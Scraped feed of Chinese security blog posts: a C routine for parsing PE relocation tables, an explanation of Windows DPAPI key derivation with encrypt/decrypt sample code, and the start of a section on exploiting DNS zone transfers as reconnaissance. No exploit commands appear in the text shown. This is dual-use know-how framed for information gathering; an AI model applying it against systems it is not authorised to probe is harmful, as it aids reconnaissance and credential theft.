<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析重定位表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">RelocTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">RelocTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">// 定义结构</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_TYPE</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		WORD Offset <span class="token operator">:</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token comment">// 偏移</span></pre></td></tr><tr><td data-num="9"></td><td><pre>		WORD Type <span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token punctuation">&#125;</span>TYPE<span class="token punctuation">,</span><span class="token operator">*</span>PTYPE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token comment">// 定位重定位表</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	PIMAGE_DATA_DIRECTORY pRelocDir <span class="token operator">=</span> <span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_BASERELOC<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">// 填充重定位表的结构</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	PIMAGE_BASE_RELOCATION pReloc <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_BASE_RELOCATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token comment">// 定位区段</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	PIMAGE_SECTION_HEADER pSection <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>pNt<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pReloc<span class="token operator">-></span>SizeOfBlock <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token comment">// 找到本 0x1000 个字节的起始位置</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		DWORD dwCount <span class="token operator">=</span> <span class="token punctuation">(</span>pReloc<span class="token operator">-></span>SizeOfBlock <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		DWORD dwRva <span class="token operator">=</span> pReloc<span class="token operator">-></span>VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		<span class="token comment">// 数组节点</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		PTYPE pRelocArr <span class="token operator">=</span> <span class="token punctuation">(</span>PTYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>pReloc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"区段：%s\n"</span><span class="token punctuation">,</span> pSection<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> dwRva<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"项目：%X H / %d D\n"</span><span class="token punctuation">,</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">,</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		<span class="token comment">// 找到下一个 0x1000 字节的结构体</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		pReloc <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_BASE_RELOCATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pReloc <span class="token operator">+</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>			PDWORD pData <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>			DWORD pDataOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"区段：%08X\n"</span><span class="token punctuation">,</span> pData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"偏移：%08X\n\n"</span><span class="token punctuation">,</span> pDataOffset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220227123237585.png" alt="image-20220227123237585" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows信息搜集篇（五）之DPAPI 数据加密与Dns域传送漏洞利用</title>
    <url>/article/e26d51b.html</url>
    <content><![CDATA[<h2 id="dpapi-数据加密"><a class="anchor" href="#dpapi-数据加密">#</a> DPAPI 数据加密</h2>
<h3 id="00x01-什么是dpapi"><a class="anchor" href="#00x01-什么是dpapi">#</a> 00x01 什么是 DPAPI</h3>
<p><code>DPAPI</code>  是 <code>Windows</code>  系统级对数据进行加解密的一种接口，无需自实现加解密代码，微软已经提供了经过验证的高质量加解密算法，提供了用户态的接口，对密钥的推导，存储，数据加解密实现透明，并提供较高的安全保证。</p>
<p><code>DPAPI</code>  提供了两个用户态接口， <code>CryptProtectData</code>  加密数据， <code>CryptUnprotectData</code>  解密数据，加密后的数据由应用程序负责安全存储，应用无需解析加密后的数据格式。但是，加密后的数据存储需要一定的机制，因为该数据可以被其他任何进程用来解密，当然 <code>CryptProtectData</code>  也提供了用户输入额外数据来参与对用户数据进行加密的参数，但依然无法放于暴力破解。</p>
<p>总体来说，程序可以使用 <code>DPAPI</code>  来对自己敏感的数据进行加解密，也可持久化存储，程序或系统重启后可解密密文获取原文。如果应用程序，对此敏感数据只是暂存于内存，为了防止被黑客 <code>dump</code>  内存后进行破解，也对此数据无需进行持久化存储，微软还提供了加解密内存的接口 <code>CryptProtectMemory</code>  和 <code>CryptUnprotectMemory</code> 。加解密内存的接口，并可指定 Flag 对此内存加解密的声明周期做控制，详细见 <code>Memory</code>  加密及优缺点章节。</p>
<h3 id="00x02-dpapi的会话密钥推导"><a class="anchor" href="#00x02-dpapi的会话密钥推导">#</a> 00x02 DPAPI 的会话密钥推导</h3>
<p><code>DPAPI</code>  使用的会话密钥由 <code>MasterKey</code>  和随机数的 <code>HASH</code>  推导产生，而 <code>MasterKey</code>  的保护由用户登录密码 <code>HASH</code> ，随机数，和迭代次数通过可靠的 <code>PBKDF2</code>  密钥推导算法生成。其中迭代次数可以修改，  <code>MasterKeyIterationCount</code>  存储在  <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Protect\Providers\GUID</code>  允许系统管理员增加此迭代计数的密钥中。但是，它不能减少到 4000 以下。</p>
<p>为了防止篡改 <code>MasterKey</code> ，它使用 <code>HMAC</code>  进行散列。 <code>DPAPI</code>  再次使用 <code>SHA-1</code>  作为 <code>HMAC</code>  和用户的密码来派生 <code>HMAC</code>  密钥。然后使用来自上面的密码派生加密密钥和 <code>Triple-DES</code>  来加密 <code>MasterKey</code>  和 <code>MasterKey</code>  的 <code>HMAC</code> 。 <code>salt</code>  和迭代计数都是非秘密值，因此与加密的 <code>MasterKey</code>  一起存储，但未加密。这允许 <code>DPAPI</code>  在给定用户密码的情况下轻松解密 <code>MasterKey</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207145441416.png" alt="image-20211207145441416" /></p>
<p>如上图所示，会话密钥的推导使用了 <code>MasterKey</code> ，随机数，和可选的系统登录密码，用户密码推导生成。16 字节的随机数，会以明文的形式存储于加密后的 <code>BLOB</code>  中， <code>MasterKey</code>  是受推导的加密密钥保护。</p>
<h3 id="00x03-dpapi密钥备份恢复"><a class="anchor" href="#00x03-dpapi密钥备份恢复">#</a> 00x03 DPAPI 密钥备份恢复</h3>
<p>恢复密钥是在用户选择从用户的控制面板创建密码重置磁盘（ <code>PRD</code> ）时生成的。首先， <code>DPAPI</code>  生成一个 <code>2048</code>  位 <code>RSA</code>  公钥 / 私钥对，它是恢复密钥。然后使用公钥将当前密码加密并存储在用户的配置文件中，同时将私钥存储到 <code>PRD</code> ， <code>PRD</code>  实际上可以是任何可移动媒体，然后从内存中移除。私钥只存储在 <code>PRD</code>  中，而其他任何地方都不存在，所以用户将 <code>PRD</code>  保存在安全的地方非常重要。</p>
<p>如果用户输入错误的密码， <code>Windows</code>  会询问他们是否想要使用 PRD 并重置密码。如果他们选择，运行向导会提示输入新密码，并使用 PRD 上的私钥解密旧密码并进行更改。</p>
<h3 id="00x04-dpapi接口调用"><a class="anchor" href="#00x04-dpapi接口调用">#</a> 00x04 DPAPI 接口调用</h3>
<ul>
<li>对数据进行加密：</li>
</ul>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">DATA_BLOB</span> DataIn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token constant">DATA_BLOB</span> DataOut<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token constant">DATA_BLOB</span> BlobKey<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    DataIn<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token function">const_cast</span><span class="token punctuation">(</span>cbDataIn<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 明文数据</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    DataIn<span class="token punctuation">.</span>cbData <span class="token operator">=</span> nLen<span class="token punctuation">;</span> <span class="token comment">// 明文数据长度</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    BlobKey<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token function">const_cast</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 可选用户密码</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    BlobKey<span class="token punctuation">.</span>cbData <span class="token operator">=</span> lenKey<span class="token punctuation">;</span> <span class="token comment">// 可选用户密码长度</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span> promp<span class="token punctuation">;</span> <span class="token comment">// 是否与用户交互输入可选的用户密码</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    promp<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    promp<span class="token punctuation">.</span>szPrompt <span class="token operator">=</span> <span class="token constant">L</span><span class="token string">"测试加密"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    promp<span class="token punctuation">.</span>dwPromptFlags <span class="token operator">=</span> <span class="token constant">CRYPTPROTECT_PROMPT_ON_PROTECT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    promp<span class="token punctuation">.</span>hwndApp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CryptProtectData</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DataIn<span class="token punctuation">,</span> <span class="token constant">L</span><span class="token string">"敏感数据"</span><span class="token punctuation">,</span> key <span class="token operator">?</span> <span class="token operator">&amp;</span>BlobKey<span class="token operator">:</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>promp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>DataOut<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token operator">*</span>encLen <span class="token operator">=</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">;</span>      <span class="token comment">// 返回密文数据长度</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token operator">*</span>encData <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>encData<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 加密后数据</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">LocalFree</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>对数据进行解密：</li>
</ul>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">DATA_BLOB</span> DataIn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token constant">DATA_BLOB</span> DataOut<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token constant">DATA_BLOB</span> BlobKey<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token constant">LPWSTR</span> pDescrOut <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    BlobKey<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token function">const_cast</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 可选用户密码</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    BlobKey<span class="token punctuation">.</span>cbData <span class="token operator">=</span> lenKey<span class="token punctuation">;</span> <span class="token comment">// 可选用户密码长度</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    DataIn<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">BYTE</span> <span class="token operator">*</span><span class="token punctuation">)</span>const_cast<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>encData<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 待解密数据</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span> promp<span class="token punctuation">;</span> <span class="token comment">// 是否与用户交互输入可选的用户密码</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    promp<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    DataIn<span class="token punctuation">.</span>cbData <span class="token operator">=</span> encLen<span class="token punctuation">;</span> <span class="token comment">// 待解密数据长度</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span> promp<span class="token punctuation">;</span> <span class="token comment">// 是否与用户交互输入可选的用户密码</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    promp<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    promp<span class="token punctuation">.</span>szPrompt <span class="token operator">=</span> <span class="token constant">L</span><span class="token string">"测试解密"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    promp<span class="token punctuation">.</span>dwPromptFlags <span class="token operator">=</span> <span class="token constant">CRYPTPROTECT_PROMPT_ON_UNPROTECT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    promp<span class="token punctuation">.</span>hwndApp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    </pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CryptUnprotectData</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DataIn<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pDescrOut<span class="token punctuation">,</span> key <span class="token operator">?</span> <span class="token operator">&amp;</span>BlobKey<span class="token operator">:</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>promp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>DataOut<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    </pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token operator">*</span>nLen <span class="token operator">=</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token operator">*</span>cbDataIn <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>cbDataIn<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 解密后的数据明文</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token function">LocalFree</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>
<p>交互弹框提示</p>
</li>
<li>
<p>加密前提示设置加密等级</p>
</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207150741684.png" alt="image-20211207150741684" /></p>
<ul>
<li>加密等级分类</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207150811233.png" alt="image-20211207150811233" /></p>
<ul>
<li>加密等级设置为高时输入用户密码</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207150833389.png" alt="image-20211207150833389" /></p>
<ul>
<li>解密时要求输入用户密码</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207150853666.png" alt="image-20211207150853666" /></p>
<ul>
<li>输入错误的用户密码提示</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207150911129.png" alt="image-20211207150911129" /></p>
<h3 id="00x05-memory加密及优缺点"><a class="anchor" href="#00x05-memory加密及优缺点">#</a> 00x05 Memory 加密及优缺点</h3>
<p><code>Memory</code>  加解密微软也提供了两个接口， <code>CryptProtectMemory</code>  内存加密， <code>CryptUnprotectMemory</code>  内存解密。一般用于即时加解密用户敏感的数据，如用户密码等。内存加解密用于防止他人在您的进程查看敏感信息，如黑客远程 <code>dump</code>  你的进程内存，分析和破解你的敏感数据。</p>
<p>通常，您使用 <code>CryptProtectMemory</code>  函数来加密您的进程正在运行时将要解密的敏感信息。请勿使用此功能保存稍后要解密的数据；如果计算机重新启动，您将无法解密数据。要将加密数据保存到文件以便稍后解密，请使用 <code>CryptProtectData</code>  函数。</p>
<p>加解密提供了三种标志：</p>
<table>
<thead>
<tr>
<th>Flag</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>CRYPTPROTECTMEMORY_SAME_PROCESS</td>
<td>只能在当前进程内加解密，进程重新运行会无法解密</td>
</tr>
<tr>
<td>CRYPTPROTECTMEMORY_CROSS_PROCESS</td>
<td>可以跨进行加解密，系统重启后失效</td>
</tr>
<tr>
<td>CRYPTPROTECTMEMORY_SAME_LOGON</td>
<td>使用相同的登录凭据来加密和解密不同进程中的内存，系统重启后失效</td>
</tr>
</tbody>
</table>
<p>如果需要持存储密文数据，可选用 <code>DPAPI</code>  的接口。如果临时缓存下敏感数据，可选用对 <code>Memory</code>  加解密的接口。</p>
<p>还有一个致命的缺陷：最低系统版本要求 <code>vista</code>  及以上系统版本，所以 <code>win xp</code>  不支持该接口。</p>
<h3 id="00x06-扩展dpapi加密等级"><a class="anchor" href="#00x06-扩展dpapi加密等级">#</a> 00x06 扩展 DPAPI 加密等级</h3>
<ul>
<li>程序内置用户密码</li>
<li>程序使用物理硬件信息作为用户密码</li>
<li>结合 PKI 技术实现加密用户密码</li>
<li>或者以上的组合</li>
</ul>
<h3 id="00x07-附录"><a class="anchor" href="#00x07-附录">#</a> 00x07 附录</h3>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvZHBhcGlfZGF0YV9kZWNyeXB0b3IuaHRtbA==">DPAPI 在线加解密网站</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczk5NTM1NS5hc3B4">微软参考资料</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL211eHEvRFBBUEk=">github 代码</span></li>
</ul>
<h2 id="dns域传送漏洞利用"><a class="anchor" href="#dns域传送漏洞利用">#</a> Dns 域传送漏洞利用</h2>
<h3 id="dns分类"><a class="anchor" href="#dns分类">#</a> DNS 分类</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">A</span>记录 <span class="token constant">IP</span>地址记录<span class="token punctuation">,</span>记录一个域名对应的<span class="token constant">IP</span>地址</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">AAAA</span>记录  IPv6地址记录，记录一个域名对应的IPv6地址</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token constant">CNAME</span>记录   别名记录，记录一个主机的别名</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">MX</span>记录    电子邮件交换记录，记录一个邮件域名对应的<span class="token constant">IP</span>地址，比如my<span class="token punctuation">[</span>at<span class="token punctuation">]</span>lijiejie<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="5"></td><td><pre>后面的部分lijiejie<span class="token punctuation">.</span>com，邮件服务器对应的<span class="token constant">IP</span>地址</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token constant">NS</span>记录      域名服务器记录 <span class="token punctuation">,</span>记录该域名由哪台域名服务器解析</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token constant">PTR</span>记录     反向记录，也即从<span class="token constant">IP</span>地址到域名的一条记录</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token constant">TXT</span>记录     记录域名的相关文本信息</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">SOA</span>记录   start <span class="token keyword">of</span> anthorization 开始授权，是一种比较难以理解的记录值，一般二级域名才会有</pre></td></tr></table></figure><h3 id="dns域传送"><a class="anchor" href="#dns域传送">#</a> DNS 域传送</h3>
<p>作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。 <code>DNS</code>  服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用 “ <code>DNS</code>  域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>若 <code>DNS</code>  服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p>
